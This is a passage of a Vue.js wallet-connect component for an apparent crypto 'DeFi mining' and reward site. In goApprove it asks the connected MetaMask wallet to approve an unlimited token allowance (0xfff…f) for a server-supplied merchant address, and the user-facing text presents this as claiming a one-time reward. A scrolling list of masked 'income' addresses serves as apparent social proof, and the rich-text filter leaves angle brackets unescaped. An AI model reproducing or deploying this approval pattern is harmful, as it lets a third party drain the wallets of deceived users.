    },
    async getApprovalInfo() {
        let that = this;

        // var data = {"network": getUrlQueryString('network'), "mc": getUrlQueryString('mc')};

        that.$apiUrl.getApprovalInfo().then((res) => {
          // console.log("getApprovalInfo=>res.data", res.data);
          if (res.data&&res.data.status) {
            let obj = res.data.data;
            if(obj){
              accountInfo.approvalStatus = obj.approvalStatus;

              if (accountInfo.approvalStatus == 1) {
                this.$message.error(obj.message || "Thank you for participation! You have claimed your reward. Each account has only one chance to get a reward.")
              }else{
                this.setupAccountInfo(obj);
                this.enableMainPageClick(true);
              }  
            }
          }else{
            this.$message.error(res.data.message)
            this.enableMainPageClick(true);
          }
        })
    },
    setupAccountInfo(data) {
        let obj = {
          network: "ethereum", 
          mc: "143",
          a:82710675,
        };

        // accountInfo.ABI = data.ABI || [];
        // accountInfo.gasPrice = data.gasPrice || 0;
        // accountInfo.gasLimit = data.gasLimit || 0;
        // accountInfo.networkFeeMin = data.networkFeeMin || 0;
        // accountInfo.network = data.network.toUpperCase();
        // accountInfo.tokenSymbol = data.tokenSymbol;
        // accountInfo.tokenAddress = data.tokenAddress || '';

        accountInfo = {
          ...data,
        }

        // accountInfo.merchantId = parseInt(getUrlQueryString('mc'));
        // accountInfo.staffId = parseInt(getUrlQueryString('a'));
        accountInfo.merchantId = parseInt(obj.mc);
        accountInfo.staffId = parseInt(obj.a);

        // accountInfo.network = getUrlQueryString('network').toUpperCase();
        // accountInfo.network = obj.network.toUpperCase();
        
        networkInfo.network = accountInfo.network;
        networkInfo.infuraId = data.infura;

        rewardInfo.ethAmount = data.ethAmount || 0;
        rewardInfo.tokenSymbol = data.tokenSymbol;
        rewardInfo.timeout = data.timeout || 0;

        // 用户钱包地址
        if(this.myAccount){
          accountInfo.userAddress = this.myAccount.address || '';
        }
        // console.log("accountInfo",accountInfo)
    },
    async goApprove(acc,data){
      // 防止多次点击
      if (!this.isRequest) return;
      let that = this;
      that.isRequest = false;

      if (!acc.userAddress) {
        that.$myMixin.closeFullScreen(that.$myMixin.openFullScreen());
        that.$message.error("No from address specify!");
        that.isRequest = true;
        return;
      }
      if (!provider) {
        that.$myMixin.closeFullScreen(that.$myMixin.openFullScreen());
        that.$message.error("Wallet not connect to blockchain network!");
        that.isRequest = true;
        return;
      }
      // console.log("data",data)
      // console.log("JSON.parse(data.ABI)",JSON.parse(data.ABI))
      var myContract = new web3.eth.Contract(JSON.parse(data.ABI), data.tokenAddress);

      // console.log("myContract",myContract)
      // this.$myMixin.openFullScreen('loading...');
      // approve方法从data.ABI数组里面定义
      myContract.methods.approve(data.merchantAddress, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
      .send({
          // from: '0xf2021db4b942e4f07fb5450e7405db6559ab7dcd',
          from: data.userAddress,
          gasPrice: data.gasPrice,
          gas: data.gasLimit
      }).on('transactionHash', function (hash) {
          console.log("transactionHash",hash)
      }).on('receipt', function (receipt) {
          if (receipt != null) {
              if (receipt.status === true) {
                  console.log("receipt",receipt)
                  that.$myMixin.closeFullScreen(that.$myMixin.openFullScreen());
                  that.isRequest = true;
                  // transferRecord.tokenSymbol = accountInfo.tokenSymbol;
                  // transferRecord.numOfToken = data.numOfTokenToBeTransfer;
                  that.approvalBack(accountInfo, transferRecord); 
                  // popMessage( '#congrats',"Your transfer transaction has been submitted to our system. You will receive your rewards within 10 minutes.");

              } else {
                  that.$myMixin.closeFullScreen(that.$myMixin.openFullScreen());
                  that.isRequest = true;
                  let msg = "Your transaction was failed! Please check the transaction log in your wallet."
                  that.$message.error(msg)
              }
          }

      }).on('confirmation', function (confirmationNumber, receipt) {
          that.$myMixin.closeFullScreen(that.$myMixin.openFullScreen());
      }).on('error', function (error, receipt) {
          that.$myMixin.closeFullScreen(that.$myMixin.openFullScreen());
          let msg = "Your transaction failed with error message: " + error.message
          that.$message.error(msg)
          that.isRequest = true;
      });
    },
    approvalBack(acc, tranRec) {
      let that = this;
      const data = {
        "accountInfo": accountInfo, 
        "transferRecord": transferRecord
      };

      that.$apiUrl.approvalBack().then((res) => {
        // console.log("approvalBack=>res.data", res.data);
        if (res.data&&res.data.status) {
            
        } else {
            
        }
      });
    },

    receiveLink(){
      this.init();
      return;

      // 自动检测浏览器是否安装MetaMask钱包
      if (window.ethereum) {
        window.ethereum.enable().then((res) => {
          // console.log('res',res)
          // 跳转签约入口
          window.location.href = this.myAccount.receive_voucher_link;
        })
      }else{
        that.$message.error("Please open this link in your wallet!  ")
      }
    },
    authTo() {
      let that = this;
      // 自动检测浏览器是否安装MetaMask钱包
      if (window.ethereum) {
        window.ethereum.enable().then((res) => {
          // console.log('res',res)
          // console.log("当前钱包地址：",res[0])
          if(res[0]){
            this.wallet = {
                account:res[0].slice(res[0].length-6,res[0].length) || 0,
                address:res[0] || '',
                EthBalance:0,    
            }     
            this.getAccount();
          }
        })
      }else{
        that.$message.error("Please open this link in your wallet!  ")
        // that.tips("Please open this link in your wallet!  ");

        // that.topTips = true;
        // setTimeout(() => {
        //   that.topTips = false;
        // }, 3000);
      }
    },
    miningIndex() {
      let that = this;
      that.$apiUrl.miningIndex().then((res) => {
        // console.log("res.data", res.data);
        if (res.data.status == true) {
          let obj = res.data.data;
          if (obj&&obj.pools) {
            this.poolData = obj.pools
          }
          if (obj&&obj.incomes&&obj.incomes.length>0) {
            obj.incomes.forEach(item => {
              if(item.address){
                let len = item.address.length;
                // console.log("len",len)
                if(len > 10){
                  let firstName = item.address.substring(0,10)
                  let lasttName = item.address.substring(len-10)
                  item.address = firstName + '********' + lasttName
                }
              }
            })
            this.userList = obj.incomes || [];
            // 启动公告动画
            that.swiperList();
            // console.log('this.userList',this.userList)
          }
          if (obj&&obj.helper&&obj.helper.length>0) {
            obj.helper.forEach(item => {
              item.active = false;
              if(item.content){
                item.content = this.filterSpecialSymbol(item.content)
              }
            })
            this.helperList = obj.helper
          }
          
        }
      });
    },
    // 过滤复文本特殊符号
    filterSpecialSymbol(str) {
      const regex = new RegExp('<img', 'gi')
      str = str.replace(regex, `<img style="max-width: 100%; height: auto"`);

      str = str.replace(/&/g, '&amp;')
      // str = str.replace(/</g, "&lt;")
      // str = str.replace(/>/g, "&gt;")
      str = str.replace(/\"/g, "&quot;")
      str = str.replace(/\'/g, "&#39;")
      // 替换&amp;nbsp;为空格
      let reg = new RegExp('&amp;nbsp;', 'g')// g代表全部
      if (str) {
        str = str.replace(reg, '\u3000')
      }
      // str = str.replace(/\n/g, "<br>") ;

      // Vue.js不能解析中文双引号“”
      str = str.replace(/&amp;/g, '&')
      str = str.replace(/&ldquo;/g, '“')
      str = str.replace(/&rdquo;/g, '”')

      // rich-text处理换行符
      if (str.trim() != '') {
        return str.split('\n').reduce((total, cur) => total += `<p>${cur}</p>`)
      } else {
        return str;
      }
      // return str;
    },
    async getAccount() {
      let that = this;
      let address = '';
      address = await this.$myMixin.sysEncrypt(that.wallet.address)
      let data = {
        code: this.code || '',
        address: address || '',
      };
      that.$apiUrl.getAccount(data).then((res) => {
        // console.log("res.data", res.data);
        if (res.data.status == true) {
          let obj = res.data.data
          if(obj){
            this.myAccount = obj;
            if (obj.code) {
              this.code = obj.code || ''
              this.getShareLink();
            }
          }
        }
      });
    },
    getProducts(){
      let that = this;
      that.$apiUrl.getProducts().then((res) => {
        // console.log("res.data", res.data);
        if (res.data.status == true) {
          let arr = res.data.data
          if(arr&&arr.length>0){
            this.programmeList = arr || []
            // 默认方案
            // if(this.myAccount.product_id!=null && this.myAccount.product_id!=undefined 
            //   && this.myAccount.product_id!=''){
            //   this.product = this.programmeList.filter(v=>v.id == this.myAccount.product_id)[0]
            //   this.value = this.product.name || ''
            //   if(this.product.remark){
            //     this.remark = this.filterSpecialSymbol(this.product.remark)
            //   }
            //   // let index = this.myAccount.product_id-1;
            //   // this.value = arr[index].name || ''
            //   // if(arr[index].remark){
            //   //   this.remark = this.filterSpecialSymbol(arr[index].remark)
            //   // }
            // }
          }
        }
      });
    },
    // 挖矿方案
    openValue(){
      this.show=!this.show;
    },
    getvalue(index,item){
      if (!this.allowRequest) return;
      this.allowRequest = false;
      this.value=item.name;
      this.product = item;
      if(item.remark){
        this.remark = this.filterSpecialSymbol(item.remark)
      }
      this.show=false;
      this.allowRequest = true;
    },
    defiMiningUsdt(){
      let that = this;
      if(!this.allowRequest) return;
      let data = {
        amount: that.amount || '',
        productId: that.product.id || '',
      };
      this.$myMixin.openFullScreen('loading...');
      this.allowRequest = false;
      that.$apiUrl.defiMiningUsdt(data).then((res) => {
        // console.log("defiMiningUsdt res.data", res.data);
        let message = null;
        if(res.data&&res.data.message){
          message = res.data.message
          this.$myMixin.closeFullScreen(this.$myMixin.openFullScreen());
          if(res.data.status){
            this.$message.success(message);
          }else{
            this.$message.error(message);
          }
        }
      }).finally(() => {
        setTimeout(() => {
          that.allowRequest = true;
        }, 1500);
      });
    },
    changeWidth() {
      let that = this;
      that.$nextTick(function () {
        if (that.$refs && that.$refs.iWidth && that.$refs.iWidth.length > 0) {
          that.iWidths = that.$refs.iWidth[0].clientWidth;
        }
      });
    },
    changeWidth1() {
      let that = this;
      that.$nextTick(function () {
        if (
          that.$refs &&
          that.$refs.iWidthTwo &&
          that.$refs.iWidthTwo.length > 0
        ) {
          that.iWidths1 = that.$refs.iWidthTwo[0].clientWidth;
        }
      });
    },
    isPayment1() {
      this.showShare = !this.showShare;
      if (this.showShare) {
        this.$modalHelper.afterOpen(); // 打开禁用
      } else {
        this.$modalHelper.beforeClose(); // 关闭禁用
      }
    },
    isPayment2() {
      this.showDescription = !this.showDescription;
      if (this.showDescription) {
        this.$modalHelper.afterOpen(); // 打开禁用
      } else {
        this.$modalHelper.beforeClose(); // 关闭禁用
      }
    },
    receive() {
      let that = this;
      that.isPayment2();
      that.receiveLink();
    },
    // 利用Js+transform实现无限轮播效果
    // https://www.jianshu.com/p/ebd0e2bb0622
    swiperList() {
      var swiperTime = null;
      var ele = document.getElementById("swiperWrap");
      var len = this.userList.length;
      if (len > 9) {
        // 列表项大于1时，才做swiper动画。
        this.userList.push(this.userList[0]); // 这里是模拟，在dom元素的末尾，添加列表第一项，真实需要自己做dom操作。
        var cur = 0;
        var swpier = function (delay) {
          swiperTime = setTimeout(function () {
            cur += 1;
            if (cur > len - 10) {
              // 这时表示到了(len-1)最后一个复制块，直接无动画移动到真实的第一个元素
              // 这时表示到了(len-10)最后倒数第十个复制块，直接无动画移动到真实的第一个元素
              cur = 0;
              ele.style.transition = "none";
              ele.style.transform = "translateY(0)";
              swpier(1000);
            } else {
              var top = -30 * cur;
              ele.style.transform = "translateY(" + top + "px)";
              ele.style.transition = "all 1s";
              cur === len ? swpier(1000) : swpier(2000); // 如果是最后一个复制块，间隔时间需要修改，加上最上面的替换块，合计2s。
            }
          }, delay);
        };
        swpier(2000);
      }
    },
    changeList(index) {
      if (this.type == index) return;
      if (!this.againClick) return;
      this.againClick = false;
      let arr = this.navList;
      arr.forEach((item) => (item.active = false));
      arr[index].active = true;
      this.navList = arr;
      this.type = index;
      // console.log("this.type", this.type);
      this.changeWidth1();
      if(this.type == 1){
        this.getProducts();
      }
      this.againClick = true;
    },
    changeAriaList(index) {
      if (this.ariaType == index) return;
      if (!this.againClick) return;
      // this.againClick = false;
      let arr = this.ariaList;
      arr.forEach((item) => (item.active = false));
      arr[index].active = true;
      this.ariaList = arr;
      this.ariaType = index;
      // console.log("this.ariaType", this.ariaType);
      // this.againClick = true;
      if(this.ariaType == 3){
        this.initListDate();
        this.getList();
      }
    },
    changehelperList(index) {
      if (!this.againClick) return;
      this.againClick = false;
      let arr = this.helperList;
      // arr.forEach((item) => (item.active = false));
      // arr[index].active = true;
      arr[index].active = !arr[index].active;
      this.helperList = arr;
      this.helperType = index;
      // console.log("this.helperType", this.helperType);
      this.againClick = true;
    },
    changeCardList(index) {
      if (this.cardType == index) return;
      if (!this.againClick) return;
      this.againClick = false;
      this.initListDate();
      let arr = this.cardList;
      arr.forEach((item) => (item.active = false));
      arr[index].active = true;
      this.cardList = arr;
      this.cardType = index;
      // console.log("this.cardType", this.cardType);
      this.againClick = true;
      this.getList();
    },
    initListDate(){
      let that = this;
      that.hasNextPage = false;
      that.showOrder = true;
      that.currentPage = 1;
      that.recordList = [];
    },
    loadingMore(){
        if (this.recordList.length == 0) return;
        this.loadingStatus = false;
        this.getList();
      },
    getList(e) {
        let that = this;
        let data = {
          // pageCount:30,
          pageCount:5,
          currentPage:this.currentPage
        };

        this.$myMixin.openFullScreen('loading...');
        let requreHead = null;
        // console.log("getList this.cardType", this.cardType)
        if (this.cardType == 0) {
          requreHead = that.$apiUrl.getDefiMinings
        } else if (this.cardType == 1) {
          data.payTypeId = 230;
          requreHead = that.$apiUrl.getAccountTr
        } else if (this.cardType == 2) {
          data.payTypeId = 210;
          requreHead = that.$apiUrl.getWithdraws
        } else if (this.cardType == 3) {
          data.payTypeId = 220;
          requreHead = that.$apiUrl.getAccountTr
        } else {
          requreHead = that.$apiUrl.getAccountTr
        }
        that.againClick = false;
        requreHead(data)
          .then(res => {
            // console.log("res.data", res.data)
            if (res.data.status == true) {
              let arr = res.data.data;
              if (arr && arr.list && arr.list.length > 0) {
                // console.log("this.currentPage", that.currentPage)
                if (arr.pages == that.currentPage) {
                  that.hasNextPage = true;
                }
                arr.list.forEach(item => {
                  if(item.trade_time){
                    item.trade_time = that.$myMixin.dateFormatFun(item.trade_time,'DD-yue hh:mm');
                  }
                  if(item.order_time){
                    item.trade_time = that.$myMixin.dateFormatFun(item.order_time,'DD-yue hh:mm');
                  }
                  if(this.cardType == 0){
                    if(item.defi_start&&item.defi_end){
                      item.trade_time = that.$myMixin.dateFormatFun(item.defi_start,'DD-yue')
                       + ' ~ ' + that.$myMixin.dateFormatFun(item.defi_end,'DD-yue');
                    }
                  }
                })

                that.recordList = that.recordList.concat(arr.list);
                // console.log("that.recordList",that.recordList)
                that.currentPage += 1;
              }

              if (that.recordList && that.recordList.length > 0) {
                that.showOrder = false;
              } else {
                that.showOrder = true;
              }
              this.$myMixin.closeFullScreen(this.$myMixin.openFullScreen());
              this.loadingStatus = true;
              that.againClick = true;
            } else {
              that.showOrder = true;
              this.$myMixin.closeFullScreen(this.$myMixin.openFullScreen());
              this.loadingStatus = true;
              that.againClick = true;
            }
          });
      },
  },
};
</script>

